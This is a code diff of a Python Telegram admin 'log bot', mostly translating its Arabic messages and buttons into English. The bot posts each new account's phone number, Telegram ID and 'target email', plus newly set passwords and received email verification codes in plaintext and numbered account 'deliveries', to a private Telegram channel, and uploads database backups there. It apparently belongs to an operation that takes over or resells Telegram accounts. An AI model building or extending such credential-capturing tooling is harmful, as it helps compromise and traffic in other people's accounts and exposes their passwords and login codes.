@@ -40,35 +40,35 @@ async def send_log(app: Application, log_type: str, message: str):
         print(f"Error sending log: {e}")
 
 async def log_new_account(app: Application, phone: str, telegram_id: int, target_email: str):
-    msg = f"📥 <b>حساب جديد</b>\n\n📱 الرقم: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n📧 الإيميل المستهدف:\n<code>{target_email}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    msg = f"📥 <b>NEW ACCOUNT</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n📧 Target Email:\n<code>{target_email}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     await send_log(app, "new_account", msg)
 
 async def log_password_set(app: Application, phone: str, telegram_id: int, password: str):
-    msg = f"🔐 <b>تم تعيين كلمة مرور جديدة</b>\n\n📱 الرقم: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n🔑 كلمة المرور: <code>{password}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    msg = f"🔐 <b>PASSWORD SET</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n🔑 Password: <code>{password}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     await send_log(app, "password_set", msg)
 
 async def log_email_set(app: Application, phone: str, telegram_id: int, email: str):
-    msg = f"📧 <b>تم تعيين الإيميل بنجاح</b>\n\n📱 الرقم: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n📧 الإيميل: <code>{email}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    msg = f"📧 <b>EMAIL CONFIRMED</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n📧 Email: <code>{email}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     await send_log(app, "email_set", msg)
 
 async def log_email_code(app: Application, phone: str, telegram_id: int, code: str, email_hash: str):
-    msg = f"📨 <b>كود إيميل جديد</b>\n\n📱 الرقم: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n🔢 الكود: <code>{code}</code>\n#️⃣ Hash: <code>{email_hash}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    msg = f"📨 <b>EMAIL CODE RECEIVED</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n🔢 Code: <code>{code}</code>\n#️⃣ Hash: <code>{email_hash}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     await send_log(app, "email_code", msg)
 
 async def log_delivery(app: Application, phone: str, telegram_id: int, delivery_num: int):
-    msg = f"📦 <b>تم التسليم #{delivery_num}</b>\n\n📱 الرقم: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    msg = f"📦 <b>DELIVERED #{delivery_num}</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     await send_log(app, "delivery", msg)
 
 async def log_error(app: Application, action: str, phone: str, error: str):
-    msg = f"❌ <b>خطأ</b>\n\n🔧 العملية: {action}\n📱 الرقم: <code>{phone}</code>\n⚠️ الخطأ: {error}\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    msg = f"❌ <b>ERROR</b>\n\n🔧 Action: {action}\n📱 Phone: <code>{phone}</code>\n⚠️ Error: {error}\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     await send_log(app, "error", msg)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
-        await update.message.reply_text("⛔ غير مصرح لك باستخدام هذا البوت")
+        await update.message.reply_text("⛔ Unauthorized")
         return
-    kb = [[InlineKeyboardButton("⚙️ إعدادات اللوجات", callback_data="settings")], [InlineKeyboardButton("📢 تعيين القناة", callback_data="set_channel")], [InlineKeyboardButton("💾 نسخ احتياطي الآن", callback_data="backup_now")], [InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")]]
-    await update.message.reply_text(f"👋 مرحباً في بوت اللوجات\n\n📢 القناة: {log_channel_id or 'غير معينة'}", reply_markup=InlineKeyboardMarkup(kb))
+    kb = [[InlineKeyboardButton("⚙️ Log Settings", callback_data="settings")], [InlineKeyboardButton("📢 Set Channel", callback_data="set_channel")], [InlineKeyboardButton("💾 Backup Now", callback_data="backup_now")], [InlineKeyboardButton("📊 Stats", callback_data="stats")]]
+    await update.message.reply_text(f"👋 Log Bot\n\n📢 Channel: {log_channel_id or 'Not set'}", reply_markup=InlineKeyboardMarkup(kb))
 
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -80,10 +80,10 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         kb = []
         for key, val in log_settings.items():
             emoji = "✅" if val else "❌"
-            names = {"new_account": "حساب جديد", "password_set": "كلمة مرور", "email_set": "تعيين إيميل", "email_code": "أكواد الإيميل", "delivery": "التسليم", "error": "الأخطاء"}
+            names = {"new_account": "New Account", "password_set": "Password", "email_set": "Email Set", "email_code": "Email Codes", "delivery": "Delivery", "error": "Errors"}
             kb.append([InlineKeyboardButton(f"{emoji} {names.get(key, key)}", callback_data=f"toggle_{key}")])
-        kb.append([InlineKeyboardButton("🔙 رجوع", callback_data="back")])
-        await query.edit_message_text("⚙️ إعدادات اللوجات:\n\nاضغط لتفعيل/تعطيل:", reply_markup=InlineKeyboardMarkup(kb))
+        kb.append([InlineKeyboardButton("🔙 Back", callback_data="back")])
+        await query.edit_message_text("⚙️ Log Settings:\n\nTap to toggle:", reply_markup=InlineKeyboardMarkup(kb))
     elif data.startswith("toggle_"):
         key = data.replace("toggle_", "")
         log_settings[key] = not log_settings.get(key, True)
@@ -91,25 +91,25 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         kb = []
         for k, v in log_settings.items():
             emoji = "✅" if v else "❌"
-            names = {"new_account": "حساب جديد", "password_set": "كلمة مرور", "email_set": "تعيين إيميل", "email_code": "أكواد الإيميل", "delivery": "التسليم", "error": "الأخطاء"}
+            names = {"new_account": "New Account", "password_set": "Password", "email_set": "Email Set", "email_code": "Email Codes", "delivery": "Delivery", "error": "Errors"}
             kb.append([InlineKeyboardButton(f"{emoji} {names.get(k, k)}", callback_data=f"toggle_{k}")])
-        kb.append([InlineKeyboardButton("🔙 رجوع", callback_data="back")])
-        await query.edit_message_text("⚙️ إعدادات اللوجات:\n\nاضغط لتفعيل/تعطيل:", reply_markup=InlineKeyboardMarkup(kb))
+        kb.append([InlineKeyboardButton("🔙 Back", callback_data="back")])
+        await query.edit_message_text("⚙️ Log Settings:\n\nTap to toggle:", reply_markup=InlineKeyboardMarkup(kb))
     elif data == "set_channel":
         context.user_data["waiting_channel"] = True
-        await query.edit_message_text("📢 حول أي رسالة من القناة الخاصة إلى هذا البوت لتعيينها كقناة اللوجات")
+        await query.edit_message_text("📢 Forward any message from your private channel to set it as log channel")
     elif data == "backup_now":
         await do_backup(context.application, query.message.chat_id)
     elif data == "stats":
-        from backend.models.database import async_session, Account
+        from backend.models.database import async_session, Account, AuthStatus
         from sqlalchemy import select, func
         async with async_session() as session:
             total = await session.scalar(select(func.count()).select_from(Account))
-            completed = await session.scalar(select(func.count()).select_from(Account).where(Account.status == "completed"))
-        await query.edit_message_text(f"📊 الإحصائيات:\n\n📱 إجمالي الحسابات: {total}\n✅ المكتملة: {completed}\n📢 القناة: {log_channel_id or 'غير معينة'}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back")]]))
+            completed = await session.scalar(select(func.count()).select_from(Account).where(Account.status == AuthStatus.COMPLETED))
+        await query.edit_message_text(f"📊 Stats:\n\n📱 Total Accounts: {total}\n✅ Completed: {completed}\n📢 Channel: {log_channel_id or 'Not set'}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif data == "back":
-        kb = [[InlineKeyboardButton("⚙️ إعدادات اللوجات", callback_data="settings")], [InlineKeyboardButton("📢 تعيين القناة", callback_data="set_channel")], [InlineKeyboardButton("💾 نسخ احتياطي الآن", callback_data="backup_now")], [InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")]]
-        await query.edit_message_text(f"👋 بوت اللوجات\n\n📢 القناة: {log_channel_id or 'غير معينة'}", reply_markup=InlineKeyboardMarkup(kb))
+        kb = [[InlineKeyboardButton("⚙️ Log Settings", callback_data="settings")], [InlineKeyboardButton("📢 Set Channel", callback_data="set_channel")], [InlineKeyboardButton("💾 Backup Now", callback_data="backup_now")], [InlineKeyboardButton("📊 Stats", callback_data="stats")]]
+        await query.edit_message_text(f"👋 Log Bot\n\n📢 Channel: {log_channel_id or 'Not set'}", reply_markup=InlineKeyboardMarkup(kb))
 
 async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
@@ -119,7 +119,7 @@ async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE):
         log_channel_id = update.message.forward_from_chat.id
         save_config()
         context.user_data["waiting_channel"] = False
-        await update.message.reply_text(f"✅ تم تعيين القناة: {log_channel_id}\n\nتأكد أن البوت أدمن في القناة!")
+        await update.message.reply_text(f"✅ Channel set: {log_channel_id}\n\nMake sure bot is admin in the channel!")
 
 async def do_backup(app: Application, chat_id: int = None):
     backup_dir = f"backups/{datetime.now().strftime('%Y%m%d_%H%M%S')}"
@@ -133,11 +133,11 @@ async def do_backup(app: Application, chat_id: int = None):
         for db_file in files_backed:
             try:
                 with open(f"{backup_dir}/{db_file}", 'rb') as f:
-                    await app.bot.send_document(chat_id=log_channel_id, document=f, caption=f"💾 نسخة احتياطية: {db_file}\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+                    await app.bot.send_document(chat_id=log_channel_id, document=f, caption=f"💾 Backup: {db_file}\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
             except:
                 pass
     if chat_id:
-        await app.bot.send_message(chat_id=chat_id, text=f"✅ تم إنشاء نسخة احتياطية\n📁 {len(files_backed)} ملفات")
+        await app.bot.send_message(chat_id=chat_id, text=f"✅ Backup created\n📁 {len(files_backed)} files")
 
 async def backup_scheduler(app: Application):
     while True:
